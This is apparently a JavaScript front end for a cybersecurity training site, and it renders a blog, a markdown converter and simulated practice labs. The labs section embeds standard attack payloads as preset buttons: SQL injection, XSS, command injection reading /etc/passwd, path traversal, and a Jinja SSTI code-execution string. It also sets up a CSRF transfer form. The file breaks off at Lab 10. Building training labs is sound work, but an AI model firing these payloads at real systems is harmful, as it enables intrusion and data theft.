/**
 * Ethical Explorers — Blog, Labs & Videos Engine
 * Handles blog listing, article rendering, YouTube auto-embed,
 * practical labs, video gallery, search, categories, and pagination
 */

// ================================================================
// BLOG DATA CACHE
// ================================================================
let postsCache = null;
let labsCache = null;
let videosCache = null;

async function fetchPosts() {
  if (postsCache && postsCache.length > 0) return postsCache;
  try {
    const res = await fetch('data/posts.json?v=20260903b');
    if (!res.ok) throw new Error('Fetch failed');
    postsCache = await res.json();
    return postsCache;
  } catch (e) {
    console.warn('Loading posts via fallback cache:', e);
    return postsCache || [];
  }
}

async function fetchLabs() {
  if (labsCache && labsCache.length > 0) return labsCache;
  try {
    const res = await fetch('data/labs.json?v=20260903b');
    if (!res.ok) throw new Error('Fetch failed');
    labsCache = await res.json();
    return labsCache;
  } catch (e) {
    console.warn('Loading labs via fallback cache:', e);
    return labsCache || [];
  }
}

async function fetchVideos() {
  if (videosCache) return videosCache;
  try {
    const res = await fetch('data/videos.json?v=20260903b');
    videosCache = await res.json();
    return videosCache;
  } catch (e) {
    console.error('Failed to load videos:', e);
    return [];
  }
}

// ================================================================
// BLOG LISTING PAGE
// ================================================================
const POSTS_PER_PAGE = 9;

async function renderBlogPage() {
  const content = document.getElementById('app-content');
  document.title = `Blog — Cybersecurity Articles | ${SITE_NAME}`;

  content.innerHTML = `
    <div class="container section-padding page-transition">
      <div class="section-header reveal">
        <h1 class="glitch-text" data-text="CYBER BLOG" style="font-size: clamp(1.5rem, 4vw, 2.5rem);">CYBER BLOG</h1>
        <p class="section-subtitle">> Decrypted intelligence from the cybersecurity frontline</p>
      </div>

      <div class="filter-bar reveal">
        <div class="search-wrapper">
          <span class="search-icon">${ICONS.search}</span>
          <input type="text" id="blog-search" class="search-input" placeholder="Search articles...">
        </div>
        <div id="blog-categories" class="category-filters"></div>
      </div>

      <div id="blog-grid" class="blog-grid reveal">
        <div class="loading-container">
          <div class="loading-spinner"></div>
          <div class="loading-text">Decrypting database archives...</div>
        </div>
      </div>

      <div id="blog-pagination" class="pagination"></div>
    </div>
  `;

  const posts = await fetchPosts();
  const categories = ['All', ...new Set(posts.map(p => p.category))];

  // Render categories
  const catContainer = document.getElementById('blog-categories');
  if (catContainer) {
    catContainer.innerHTML = categories.map(cat =>
      `<button class="category-btn ${cat === 'All' ? 'active' : ''}" data-category="${cat}">${cat}</button>`
    ).join('');

    catContainer.addEventListener('click', (e) => {
      if (!e.target.classList.contains('category-btn')) return;
      catContainer.querySelectorAll('.category-btn').forEach(b => b.classList.remove('active'));
      e.target.classList.add('active');
      filterAndRenderPosts();
    });
  }

  // Search handler
  const searchInput = document.getElementById('blog-search');
  if (searchInput) {
    let searchTimeout;
    searchInput.addEventListener('input', () => {
      clearTimeout(searchTimeout);
      searchTimeout = setTimeout(filterAndRenderPosts, 300);
    });
  }

  // Initial render
  renderPostsGrid(posts, 1);
}

function filterAndRenderPosts() {
  const searchQuery = (document.getElementById('blog-search')?.value || '').toLowerCase().trim();
  const activeCategory = document.querySelector('.category-btn.active')?.dataset.category || 'All';

  let filtered = postsCache || [];

  // Category filter
  if (activeCategory !== 'All') {
    filtered = filtered.filter(p => p.category === activeCategory);
  }

  // Search filter
  if (searchQuery) {
    filtered = filtered.filter(p =>
      p.title.toLowerCase().includes(searchQuery) ||
      p.excerpt.toLowerCase().includes(searchQuery) ||
      (p.tags || []).some(t => t.toLowerCase().includes(searchQuery)) ||
      p.category.toLowerCase().includes(searchQuery)
    );
  }

  renderPostsGrid(filtered, 1);
}

function renderPostsGrid(posts, page) {
  const grid = document.getElementById('blog-grid');
  const paginationEl = document.getElementById('blog-pagination');
  if (!grid) return;

  const totalPages = Math.ceil(posts.length / POSTS_PER_PAGE);
  const start = (page - 1) * POSTS_PER_PAGE;
  const pagePosts = posts.slice(start, start + POSTS_PER_PAGE);

  if (pagePosts.length === 0) {
    grid.innerHTML = `<div class="empty-state" style="grid-column: 1/-1;"><h3>No articles found</h3><p>Try a different search term or category.</p></div>`;
    if (paginationEl) paginationEl.innerHTML = '';
    return;
  }

  grid.innerHTML = pagePosts.map(post => createBlogCard(post)).join('');

  // Pagination
  if (paginationEl && totalPages > 1) {
    let paginationHTML = `<button ${page <= 1 ? 'disabled' : ''} onclick="paginatePosts(${page - 1})">‹ Prev</button>`;
    for (let i = 1; i <= totalPages; i++) {
      if (totalPages > 7 && Math.abs(i - page) > 2 && i !== 1 && i !== totalPages) {
        if (i === 2 || i === totalPages - 1) paginationHTML += '<button disabled>...</button>';
        continue;
      }
      paginationHTML += `<button class="${i === page ? 'active' : ''}" onclick="paginatePosts(${i})">${i}</button>`;
    }
    paginationHTML += `<button ${page >= totalPages ? 'disabled' : ''} onclick="paginatePosts(${page + 1})">Next ›</button>`;
    paginationEl.innerHTML = paginationHTML;
  } else if (paginationEl) {
    paginationEl.innerHTML = '';
  }

  // Store current page for pagination
  window._currentBlogPage = page;
  window._currentFilteredPosts = posts;
}

// Global pagination function
window.paginatePosts = function(page) {
  const posts = window._currentFilteredPosts || postsCache || [];
  renderPostsGrid(posts, page);
  document.getElementById('blog-grid')?.scrollIntoView({ behavior: 'smooth', block: 'start' });
};

// ================================================================
// SINGLE ARTICLE PAGE
// ================================================================
async function renderArticlePage(articleId) {
  const content = document.getElementById('app-content');
  const posts = await fetchPosts();
  const post = posts.find(p => p.id === articleId);

  if (!post) {
    render404Page();
    return;
  }

  document.title = `${post.title} | ${SITE_NAME}`;

  // Update meta description dynamically
  let metaDesc = document.querySelector('meta[name="description"]');
  if (metaDesc) metaDesc.setAttribute('content', post.excerpt);

  // Render article content from markdown
  const htmlContent = renderMarkdown(post.content || '');

  // Check for YouTube video
  let youtubeEmbed = '';
  if (post.youtubeId) {
    youtubeEmbed = `
      <div class="video-embed" style="margin: 2rem 0;">
        <iframe src="https://www.youtube.com/embed/${post.youtubeId}" 
                title="${post.title}" 
                frameborder="0" 
                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
                allowfullscreen
                loading="lazy"></iframe>
      </div>
    `;
  }

  // Get related posts — improved matching with tags + category, show 4
  const related = posts
    .filter(p => p.id !== post.id)
    .map(p => {
      let score = 0;
      if (p.category === post.category) score += 3;
      const postTags = (post.tags || []).map(t => t.toLowerCase());
      const pTags = (p.tags || []).map(t => t.toLowerCase());
      score += postTags.filter(t => pTags.includes(t)).length * 2;
      return { ...p, _score: score };
    })
    .filter(p => p._score > 0)
    .sort((a, b) => b._score - a._score)
    .slice(0, 4);

  const shareUrl = encodeURIComponent(`${SITE_URL}/#blog/${post.id}`);
  const shareTitle = encodeURIComponent(post.title);

  content.innerHTML = `
    <article class="article-view page-transition">
      <div class="breadcrumbs">
        <a href="#home">Home</a>
        <span class="separator">/</span>
        <a href="#blog">Blog</a>
        <span class="separator">/</span>
        <span>${post.category}</span>
      </div>

      <header class="article-header">
        <span class="article-category">${post.category}</span>
        <h1>${post.title}</h1>
        <div class="article-meta">
          <span>📅 ${post.date}</span>
          <span>✍️ ${post.author}</span>
          <span>⏱️ ${post.readTime || '5 min read'}</span>
        </div>
      </header>

      ${post.image ? `<img src="${post.image}" alt="${post.title}" class="article-cover" loading="lazy" onerror="this.style.display='none'">` : ''}

      ${youtubeEmbed}

      <div class="article-content">
        ${htmlContent}
      </div>

      <div class="blog-card-tags" style="margin-top: 2rem;">
        ${(post.tags || []).map(t => `<span class="tag">${t}</span>`).join('')}
      </div>

      <div class="article-actions">
        <a href="#blog" class="back-link">${ICONS.arrowLeft} Back to Articles</a>
        <div class="share-buttons">
          <a href="https://twitter.com/intent/tweet?url=${shareUrl}&text=${shareTitle}" target="_blank" rel="noopener noreferrer" class="share-btn" title="Share on Twitter">𝕏</a>
          <a href="https://www.linkedin.com/shareArticle?mini=true&url=${shareUrl}&title=${shareTitle}" target="_blank" rel="noopener noreferrer" class="share-btn" title="Share on LinkedIn">in</a>
          <a href="https://t.me/share/url?url=${shareUrl}&text=${shareTitle}" target="_blank" rel="noopener noreferrer" class="share-btn" title="Share on Telegram">✈</a>
          <button class="share-btn" title="Copy Link" onclick="navigator.clipboard.writeText('${SITE_URL}/#blog/${post.id}').then(()=>showToast('Link copied!'))">🔗</button>
        </div>
      </div>

      ${related.length > 0 ? `
        <div style="margin-top: 3rem;">
          <h2 style="font-size: 1.3rem; margin-bottom: 1.5rem; color: var(--neon-purple-bright);">Related Articles</h2>
          <div class="blog-grid" style="grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));">
            ${related.map(p => createBlogCard(p)).join('')}
          </div>
        </div>
      ` : ''}
    </article>
  `;

  // Add Schema.org Article structured data
  addArticleSchema(post);
}

function addArticleSchema(post) {
  // Remove any existing article schema
  const existing = document.getElementById('article-schema');
  if (existing) existing.remove();

  const schema = document.createElement('script');
  schema.type = 'application/ld+json';
  schema.id = 'article-schema';
  schema.textContent = JSON.stringify({
    "@context": "https://schema.org",
    "@type": "Article",
    "headline": post.title,
    "description": post.excerpt,
    "image": post.image || `${SITE_URL}/images/cover.jpg`,
    "author": {
      "@type": "Organization",
      "name": post.author || "Ethical Explorers"
    },
    "publisher": {
      "@type": "Organization",
      "name": "Ethical Explorers",
      "logo": { "@type": "ImageObject", "url": `${SITE_URL}/images/logo.png` }
    },
    "datePublished": post.date,
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": `${SITE_URL}/#blog/${post.id}`
    }
  });
  document.head.appendChild(schema);
}

// ================================================================
// MARKDOWN RENDERER
// ================================================================
function renderMarkdown(text) {
  if (!text) return '';

  // Normalize line endings
  text = text.replace(/\r\n/g, '\n');

  // Handle code blocks (``` ... ```)
  text = text.replace(/```(\w*)\n([\s\S]*?)```/g, (match, lang, code) => {
    const escapedCode = code.replace(/</g, '&lt;').replace(/>/g, '&gt;').trim();
    return `<pre data-lang="${lang || 'code'}"><code>${escapedCode}</code></pre>`;
  });

  // Handle inline code
  text = text.replace(/`([^`]+)`/g, '<code>$1</code>');

  // Handle headings (must be at start of line)
  text = text.replace(/^#### (.+)$/gm, '<h4>$1</h4>');
  text = text.replace(/^### (.+)$/gm, '<h3>$1</h3>');
  text = text.replace(/^## (.+)$/gm, '<h2>$1</h2>');
  text = text.replace(/^# (.+)$/gm, '<h1>$1</h1>');

  // Handle bold and italic
  text = text.replace(/\*\*\*(.+?)\*\*\*/g, '<strong><em>$1</em></strong>');
  text = text.replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>');
  text = text.replace(/(?<!\*)\*([^*\n]+)\*(?!\*)/g, '<em>$1</em>');

  // Handle links
  text = text.replace(/\[([^\]]+)\]\(([^)]+)\)/g, '<a href="$2" target="_blank" rel="noopener noreferrer">$1</a>');

  // Handle images
  text = text.replace(/!\[([^\]]*)\]\(([^)]+)\)/g, '<img src="$2" alt="$1" loading="lazy" style="border-radius: 8px; margin: 1rem 0; max-width: 100%;">');

  // Auto-embed YouTube URLs in content
  text = text.replace(
    /(?:https?:\/\/)?(?:www\.)?(?:youtube\.com\/watch\?v=|youtu\.be\/)([a-zA-Z0-9_-]{11})(?:[^\s<]*)?/g,
    '<div class="video-embed"><iframe src="https://www.youtube.com/embed/$1" title="YouTube Video" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen loading="lazy"></iframe></div>'
  );

  // Handle unordered lists
  let inList = false;
  const lines = text.split('\n');
  const processed = [];

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    const isListItem = /^[-*] (.+)$/.test(line.trim());
    const isNumberedItem = /^\d+\. (.+)$/.test(line.trim());

    if (isListItem) {
      if (!inList) { processed.push('<ul>'); inList = 'ul'; }
      processed.push(`<li>${line.trim().replace(/^[-*] /, '')}</li>`);
    } else if (isNumberedItem) {
      if (!inList) { processed.push('<ol>'); inList = 'ol'; }
      processed.push(`<li>${line.trim().replace(/^\d+\. /, '')}</li>`);
    } else {
      if (inList) {
        processed.push(inList === 'ul' ? '</ul>' : '</ol>');
        inList = false;
      }
      processed.push(line);
    }
  }
  if (inList) processed.push(inList === 'ul' ? '</ul>' : '</ol>');
  text = processed.join('\n');

  // Handle paragraphs — wrap text blocks not already in block elements
  text = text.split('\n\n').map(block => {
    block = block.trim();
    if (!block) return '';
    if (/^<(h[1-6]|ul|ol|pre|div|blockquote|table|img|section|article|header|footer|nav|aside|figure|hr)/.test(block)) {
      return block;
    }
    // Don't wrap if it's already wrapped
    if (block.startsWith('<p>')) return block;
    return `<p>${block.replace(/\n/g, '<br>')}</p>`;
  }).join('\n');

  return text;
}

// ================================================================
// PRACTICAL LABS PAGE & 20 INTERACTIVE BROWSER SANDBOXES
// ================================================================
async function renderLabsPage() {
  const content = document.getElementById('app-content');
  document.title = `20+ Interactive Practical Labs & Sandboxes | ${SITE_NAME}`;

  content.innerHTML = `
    <div class="container section-padding page-transition">
      <div class="section-header reveal">
        <h1 class="glitch-text" data-text="PRACTICAL LABS" style="font-size: clamp(1.5rem, 4vw, 2.5rem);">PRACTICAL LABS</h1>
        <p class="section-subtitle">> 20+ Interactive In-Browser Sandboxes, Vulnerability Simulators & Pentest Tools</p>
      </div>

      <!-- Quick Category Filter Bar for Sandboxes -->
      <div class="filter-bar reveal">
        <div class="sandbox-filter-nav">
          <button class="sandbox-category-btn active" data-filter="all">All 20 Labs</button>
          <button class="sandbox-category-btn" data-filter="web">Web App Security (8)</button>
          <button class="sandbox-category-btn" data-filter="crypto">Crypto & Hashes (5)</button>
          <button class="sandbox-category-btn" data-filter="network">Network & Recon (4)</button>
          <button class="sandbox-category-btn" data-filter="system">System & Exploitation (3)</button>
        </div>
      </div>

      <!-- Gamified Interactive CTF & Lab Score Tracker -->
      <div class="lab-score-tracker reveal" id="lab-score-banner">
        <div class="lab-score-stats">
          <div class="lab-stat-box">
            <span class="lab-stat-label">Hacker Rank</span>
            <span class="lab-stat-value gold" id="lab-rank-display">Novice Explorer</span>
          </div>
          <div class="lab-stat-box">
            <span class="lab-stat-label">Solved Labs</span>
            <span class="lab-stat-value green" id="lab-solved-count">0 / 20</span>
          </div>
          <div class="lab-stat-box">
            <span class="lab-stat-label">Total Score</span>
            <span class="lab-stat-value" id="lab-score-display">0 PTS</span>
          </div>
        </div>
        <div class="lab-progress-bar-container">
          <div style="display: flex; justify-content: space-between; font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-muted);">
            <span>MASTERY PROGRESS</span>
            <span id="lab-progress-percent">0%</span>
          </div>
          <div class="lab-progress-bar-bg">
            <div class="lab-progress-bar-fill" id="lab-progress-fill"></div>
          </div>
        </div>
      </div>

      <div class="sandboxes-container" id="sandboxes-container">

        <!-- LAB 1: SQL Injection Simulator -->
        <div class="interactive-sandbox-card sandbox-item" data-category="web">
          <div class="sandbox-card-header">
            <div class="sandbox-badge">LAB #1 • WEB APP SEC</div>
            <h3>💉 SQL Injection (SQLi) Vulnerability Simulator</h3>
            <p class="sandbox-sub">Test SQL injection payloads against a simulated backend authentication query and capture the admin database flag.</p>
          </div>
          <div class="sandbox-body">
            <div class="sandbox-form-grid">
              <div class="form-group">
                <label>Target Username Input:</label>
                <input type="text" id="sqli-user-input" value="" class="search-input" placeholder="Try: admin' -- or ' OR '1'='1">
              </div>
              <div class="form-group">
                <label>Target Password Input:</label>
                <input type="text" id="sqli-pass-input" value="" class="search-input" placeholder="Enter any password...">
              </div>
            </div>
            <div class="payload-quick-buttons">
              <span class="quick-label">QUICK PAYLOADS:</span>
              <button class="btn-quick-payload" data-target="sqli-user-input" data-payload="admin' --">admin' --</button>
              <button class="btn-quick-payload" data-target="sqli-user-input" data-payload="' OR '1'='1">' OR '1'='1</button>
              <button class="btn-quick-payload" data-target="sqli-user-input" data-payload="' OR 1=1 #">' OR 1=1 #</button>
              <button class="btn-quick-payload" data-target="sqli-user-input" data-payload="' UNION SELECT 1, 'admin', 'flag{sqli_bypass_mastered}' #">' UNION SELECT ...</button>
            </div>
            <div style="margin-top: 1rem;">
              <button class="btn btn-primary" id="btn-run-sqli">▶ Execute Query on Simulated DBMS</button>
            </div>
            <div class="sandbox-terminal" style="margin-top: 1.25rem;">
              <div class="terminal-header"><div class="terminal-dots"><span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span></div><div class="terminal-title">mysql_backend_query.log</div></div>
              <div class="terminal-content" id="sqli-terminal-output"><div class="terminal-line"><span class="cmd-info">[i] Click 'Execute Query' to evaluate SQL injection syntax.</span></div></div>
            </div>
          </div>
        </div>

        <!-- LAB 2: XSS Playground -->
        <div class="interactive-sandbox-card sandbox-item" data-category="web" style="margin-top:2rem;">
          <div class="sandbox-card-header">
            <div class="sandbox-badge">LAB #2 • WEB APP SEC</div>
            <h3>⚡ Cross-Site Scripting (XSS) Sandbox & Sanitizer</h3>
            <p class="sandbox-sub">Test Reflected and Stored XSS vectors and inspect how defensive HTML entity encoding prevents script execution.</p>
          </div>
          <div class="sandbox-body">
            <div class="form-group">
              <label>Injectable XSS Payload:</label>
              <input type="text" id="xss-input" value="" class="search-input" placeholder="Try: <script>alert(1)</script> or <img src=x onerror=...>">
            </div>
            <div class="payload-quick-buttons">
              <span class="quick-label">PAYLOADS:</span>
              <button class="btn-quick-payload" data-target="xss-input" data-payload="<script>alert(document.cookie)</script>">&lt;script&gt; tag</button>
              <button class="btn-quick-payload" data-target="xss-input" data-payload="<img src=x onerror=alert('XSS')>">&lt;img onerror&gt;</button>
              <button class="btn-quick-payload" data-target="xss-input" data-payload="<svg onload=alert(1)>">&lt;svg onload&gt;</button>
              <button class="btn-quick-payload" data-target="xss-input" data-payload="javascript:alert('DOM_XSS')">javascript: URI</button>
            </div>
            <div style="margin-top: 1rem;"><button class="btn btn-primary" id="btn-run-xss">▶ Test Payload in Browser Sandbox</button></div>
            <div class="sandbox-terminal" style="margin-top: 1.25rem;">
              <div class="terminal-header"><div class="terminal-dots"><span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span></div><div class="terminal-title">dom_security_analyzer.log</div></div>
              <div class="terminal-content" id="xss-terminal-output"><div class="terminal-line"><span class="cmd-info">[i] Click 'Test Payload' to analyze reflected DOM context and sanitizer response.</span></div></div>
            </div>
          </div>
        </div>

        <!-- LAB 3: Command Injection (RCE) Terminal -->
        <div class="interactive-sandbox-card sandbox-item" data-category="system" style="margin-top:2rem;">
          <div class="sandbox-card-header">
            <div class="sandbox-badge">LAB #3 • SYSTEM & RCE</div>
            <h3>💻 Command Injection (RCE) Simulated Server Terminal</h3>
            <p class="sandbox-sub">Exploit an unescaped system command parameter (ping -c 2 [input]) to gain simulated Remote Code Execution.</p>
          </div>
          <div class="sandbox-body">
            <div class="form-group">
              <label>Host to Ping (Vulnerable Parameter):</label>
              <input type="text" id="rce-input" value="" class="search-input" placeholder="Try: 127.0.0.1; <command> or 127.0.0.1 | <command>">
            </div>
            <div class="payload-quick-buttons">
              <span class="quick-label">INJECTIONS:</span>
              <button class="btn-quick-payload" data-target="rce-input" data-payload="127.0.0.1; id; uname -a">; id; uname -a</button>
              <button class="btn-quick-payload" data-target="rce-input" data-payload="127.0.0.1 | cat /etc/passwd">| cat /etc/passwd</button>
              <button class="btn-quick-payload" data-target="rce-input" data-payload="127.0.0.1 && cat /var/secret/flag.txt">&& cat flag.txt</button>
            </div>
            <div style="margin-top: 1rem;"><button class="btn btn-primary" id="btn-run-rce">▶ Execute Server Command</button></div>
            <div class="sandbox-terminal" style="margin-top: 1.25rem;">
              <div class="terminal-header"><div class="terminal-dots"><span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span></div><div class="terminal-title">bash — target_server@vulnerable_host:~$</div></div>
              <div class="terminal-content" id="rce-terminal-output"><div class="terminal-line"><span class="cmd-info">[i] Server awaiting ping probe...</span></div></div>
            </div>
          </div>
        </div>

        <!-- LAB 4: Live Brute-Force Cracker Simulator -->
        <div class="interactive-sandbox-card sandbox-item" data-category="crypto" style="margin-top:2rem;">
          <div class="sandbox-card-header">
            <div class="sandbox-badge">LAB #4 • CRYPTO & AUTH</div>
            <h3>🗝️ Real-Time Hashcat / Hydra Dictionary Cracker Simulator</h3>
            <p class="sandbox-sub">Launch a multithreaded in-browser dictionary attack against password hashes using top RockYou wordlist entries.</p>
          </div>
          <div class="sandbox-body">
            <div class="sandbox-form-grid">
              <div class="form-group">
                <label>Target MD5 Hash to Crack:</label>
                <input type="text" id="bf-hash-input" value="" class="search-input" placeholder="Paste an MD5 hash to crack...">
              </div>
              <div class="form-group">
                <label>Target Account:</label>
                <input type="text" id="bf-user-input" value="root" class="search-input" readonly>
              </div>
            </div>
            <div class="payload-quick-buttons">
              <span class="quick-label">PRESETS:</span>
              <button class="btn-quick-payload" data-target="bf-hash-input" data-payload="5f4dcc3b5aa765d61d8327deb882cf99">Hash: 'password'</button>
              <button class="btn-quick-payload" data-target="bf-hash-input" data-payload="21232f297a57a5a743894a0e4a801fc3">Hash: 'admin'</button>
              <button class="btn-quick-payload" data-target="bf-hash-input" data-payload="e10adc3949ba59abbe56e057f20f883e">Hash: '123456'</button>
              <button class="btn-quick-payload" data-target="bf-hash-input" data-payload="ee11cbb19052e40b07aac0ca060c23ee">Hash: 'user'</button>
            </div>
            <div style="margin-top: 1rem;"><button class="btn btn-primary" id="btn-run-bf">▶ Start Dictionary Brute-Force Attack</button></div>
            <div class="sandbox-terminal" style="margin-top: 1.25rem;">
              <div class="terminal-header"><div class="terminal-dots"><span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span></div><div class="terminal-title">hashcat_v6.2.6_cuda_opencl.log</div></div>
              <div class="terminal-content" id="bf-terminal-output"><div class="terminal-line"><span class="cmd-info">[i] Dictionary engine loaded (RockYou top 100). Click 'Start' to begin wordlist permutations.</span></div></div>
            </div>
          </div>
        </div>

        <!-- LAB 5: JWT Token Inspector & None Algorithm Exploit -->
        <div class="interactive-sandbox-card sandbox-item" data-category="web" style="margin-top:2rem;">
          <div class="sandbox-card-header">
            <div class="sandbox-badge">LAB #5 • WEB APP SEC</div>
            <h3>🛡️ JWT Inspector & 'None' Algorithm Exploit Lab</h3>
            <p class="sandbox-sub">Decode JSON Web Tokens and exploit the classic CVE signature bypass by forging 'alg: none' to escalate to administrator.</p>
          </div>
          <div class="sandbox-body">
            <div class="form-group">
              <label>Raw JWT Bearer Token:</label>
              <input type="text" id="jwt-input" value="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidmlzaXRvciIsInJvbGUiOiJndWVzdCIsImlzQWRtaW4iOmZhbHNlfQ.signature_dummy" class="search-input">
            </div>
            <div class="sandbox-form-grid" style="margin-top:1rem;">
              <div class="form-group"><label>Decoded Header (JSON):</label><textarea id="jwt-header" class="search-input" style="height:90px;font-family:var(--font-mono);font-size:0.8rem;"></textarea></div>
              <div class="form-group"><label>Decoded Payload (JSON):</label><textarea id="jwt-payload" class="search-input" style="height:90px;font-family:var(--font-mono);font-size:0.8rem;"></textarea></div>
            </div>
            <div style="margin-top: 1rem; display:flex; gap:0.75rem; flex-wrap:wrap;">
              <button class="btn btn-primary" id="btn-forge-jwt">⚡ Forge 'alg: none' Admin Exploit Token</button>
            </div>
            <div class="nmap-output-card" style="margin-top:1.25rem;">
              <div class="nmap-cmd-text" id="jwt-forged-result">Forged token will appear here...</div>
            </div>
          </div>
        </div>

        <!-- LAB 6: LFI & Path Traversal Lab -->
        <div class="interactive-sandbox-card sandbox-item" data-category="web" style="margin-top:2rem;">
          <div class="sandbox-card-header">
            <div class="sandbox-badge">LAB #6 • WEB APP SEC</div>
            <h3>📁 Local File Inclusion (LFI) & Path Traversal Lab</h3>
            <p class="sandbox-sub">Test directory traversal payloads against vulnerable file viewing scripts (view.php?page=...) and inspect leaked files.</p>
          </div>
          <div class="sandbox-body">
            <div class="form-group">
              <label>Target Page File Path (LFI Parameter):</label>
              <input type="text" id="lfi-input" value="" class="search-input" placeholder="Try: ../../../../etc/passwd or php://filter/...">
            </div>
            <div class="payload-quick-buttons">
              <span class="quick-label">TRAVERSALS:</span>
              <button class="btn-quick-payload" data-target="lfi-input" data-payload="../../../../etc/passwd">/etc/passwd</button>
              <button class="btn-quick-payload" data-target="lfi-input" data-payload="php://filter/convert.base64-encode/resource=config.php">php://filter</button>
              <button class="btn-quick-payload" data-target="lfi-input" data-payload="..%2f..%2f..%2fetc%2fshadow">URL Encoded</button>
              <button class="btn-quick-payload" data-target="lfi-input" data-payload="/var/log/apache2/access.log">Apache Logs</button>
            </div>
            <div style="margin-top:1rem;"><button class="btn btn-primary" id="btn-run-lfi">▶ Read Server File</button></div>
            <div class="sandbox-terminal" style="margin-top: 1.25rem;">
              <div class="terminal-header"><div class="terminal-dots"><span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span></div><div class="terminal-title">http_server_file_stream.log</div></div>
              <div class="terminal-content" id="lfi-terminal-output"><div class="terminal-line"><span class="cmd-info">[i] Enter path to read simulated filesystem contents.</span></div></div>
            </div>
          </div>
        </div>

        <!-- LAB 7: Server-Side Template Injection (SSTI) Sandbox -->
        <div class="interactive-sandbox-card sandbox-item" data-category="web" style="margin-top:2rem;">
          <div class="sandbox-card-header">
            <div class="sandbox-badge">LAB #7 • WEB APP SEC</div>
            <h3>📜 Server-Side Template Injection (SSTI) Sandbox</h3>
            <p class="sandbox-sub">Evaluate template expressions across Jinja2, Twig, and Smarty engines to identify template injection vulnerabilities.</p>
          </div>
          <div class="sandbox-body">
            <div class="form-group">
              <label>Template Expression Input:</label>
              <input type="text" id="ssti-input" value="" class="search-input" placeholder="Try: {{7*7}} or {{config.items()}}">
            </div>
            <div class="payload-quick-buttons">
              <span class="quick-label">EXPRESSIONS:</span>
              <button class="btn-quick-payload" data-target="ssti-input" data-payload="{{7*7}}">{{7*7}} (Math Evaluation)</button>
              <button class="btn-quick-payload" data-target="ssti-input" data-payload="{{config.items()}}">{{config.items()}} (Config Leak)</button>
              <button class="btn-quick-payload" data-target="ssti-input" data-payload="${7*7}">${7*7} (Java/Spring Expression)</button>
              <button class="btn-quick-payload" data-target="ssti-input" data-payload="{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}">Jinja RCE</button>
            </div>
            <div style="margin-top:1rem;"><button class="btn btn-primary" id="btn-run-ssti">▶ Render Template Engine</button></div>
            <div class="sandbox-terminal" style="margin-top: 1.25rem;">
              <div class="terminal-header"><div class="terminal-dots"><span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span></div><div class="terminal-title">jinja2_template_renderer.log</div></div>
              <div class="terminal-content" id="ssti-terminal-output"><div class="terminal-line"><span class="cmd-info">[i] Enter template syntax to simulate template rendering.</span></div></div>
            </div>
          </div>
        </div>

        <!-- LAB 8: CSRF PoC Exploit Generator -->
        <div class="interactive-sandbox-card sandbox-item" data-category="web" style="margin-top:2rem;">
          <div class="sandbox-card-header">
            <div class="sandbox-badge">LAB #8 • WEB APP SEC</div>
            <h3>🌐 CSRF (Cross-Site Request Forgery) PoC Generator</h3>
            <p class="sandbox-sub">Instantly generate weaponized, auto-submitting HTML Proof-of-Concept exploit pages to test CSRF vulnerabilities.</p>
          </div>
          <div class="sandbox-body">
            <div class="sandbox-form-grid">
              <div class="form-group"><label>Target Form Action URL:</label><input type="text" id="csrf-url" value="https://target-bank.local/transfer" class="search-input"></div>
              <div class="form-group"><label>HTTP Method:</label><select id="csrf-method" class="search-input"><option value="POST">POST</option><option value="GET">GET</option></select></div>
            </div>
            <div class="form-group" style="margin-top:1rem;"><label>Form Parameters (key=value, comma-separated):</label><input type="text" id="csrf-params" value="recipient=attacker, amount=10000, memo=hack" class="search-input"></div>
            <div style="margin-top:1rem;"><button class="btn btn-primary" id="btn-gen-csrf">⚡ Generate Auto-Submit HTML PoC</button></div>
            <div class="sandbox-terminal" style="margin-top: 1.25rem;">
              <div class="terminal-header"><div class="terminal-dots"><span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span></div><div class="terminal-title">csrf_exploit_payload.html</div></div>
              <div class="terminal-content" id="csrf-output"><div class="terminal-line"><span class="cmd-info">[i] Click 'Generate' to create weaponized CSRF HTML exploit.</span></div></div>
            </div>
          </div>
        </div>

        <!-- LAB 9: Payload Encoder & Decoder Suite -->
        <div class="interactive-sandbox-card sandbox-item" data-category="crypto" style="margin-top:2rem;">
          <div class="sandbox-card-header">
            <div class="sandbox-badge">LAB #9 • CRYPTO & ENCODING</div>
            <h3>🔐 Real-Time Multi-Format Payload Encoder & Decoder</h3>
            <p class="sandbox-sub">Simultaneously encode and decode payloads across Base64, Hexadecimal, URL, Binary, ROT13, and SHA-256 hashes.</p>
          </div>
          <div class="sandbox-body">
            <div class="form-group">
              <label>Raw Payload Input String:</label>
              <input type="text" id="encoder-input" value="<script>alert('EE_HACKER')</script>" class="search-input">
            </div>
            <div class="encoder-results-grid">
              <div class="encoder-box"><div class="enc-label">BASE64</div><div class="enc-val" id="res-base64">...</div><button class="btn-copy-enc" data-target="res-base64">Copy</button></div>
              <div class="encoder-box"><div class="enc-label">HEXADECIMAL</div><div class="enc-val" id="res-hex">...</div><button class="btn-copy-enc" data-target="res-hex">Copy</button></div>
              <div class="encoder-box"><div class="enc-label">URL ENCODED</div><div class="enc-val" id="res-url">...</div><button class="btn-copy-enc" data-target="res-url">Copy</button></div>
              <div class="encoder-box"><div class="enc-label">ROT13 CIPHER</div><div class="enc-val" id="res-rot13">...</div><button class="btn-copy-enc" data-target="res-rot13">Copy</button></div>
              <div class="encoder-box" style="grid-column: 1 / -1;"><div class="enc-label">SHA-256 HASH</div><div class="enc-val" id="res-sha256" style="color:var(--neon-cyan);">...</div><button class="btn-copy-enc" data-target="res-sha256">Copy</button></div>
            </div>
          </div>
        </div>

        <!-- LAB 10: Interactive Nmap Command Engine -->
